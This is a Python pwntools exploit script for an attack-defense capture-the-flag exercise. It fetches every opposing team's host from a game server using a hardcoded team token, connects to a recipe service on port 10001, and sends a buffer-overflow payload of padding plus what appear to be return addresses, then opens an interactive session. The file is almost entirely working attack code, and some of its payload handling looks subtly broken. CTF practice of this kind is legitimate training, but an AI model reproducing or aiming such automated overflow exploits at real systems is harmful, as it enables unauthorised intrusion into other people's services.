from swpag_client import Team
import pwn

pwn.context.arch = 'amd64'
pwn.context.log_level = 'debug'

t = Team("http://actf4_team.cse545.io/", "A17sryrF7bFDVR6D4niP")

for team in t.get_targets(1):
    host=team['hostname']
    recipe_id=team['flag_id']
    p=pwn.remote(host,'10001')
    try:
        p.recvuntil('Print Recipe')
        #p.recvline() #"Your choice (1-3): "
        #p.clean()
        p.sendline('A')
        p.recvuntil('recipe-text')
        #p.sendline('\x0a')
        stol="312031323320414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141664d5a6d4141414141414141431c400000000000e8364000000000008011400000000000d91b400000000000ba1b4000000000000a"
        #some echo hello
        base16INT = int(stol, 16)
        hex_value = hex(base16INT)
        p.sendline(hex_value)
        p.interactive()
        p.recvuntil('saved!')
    except EOFError as error:
        continue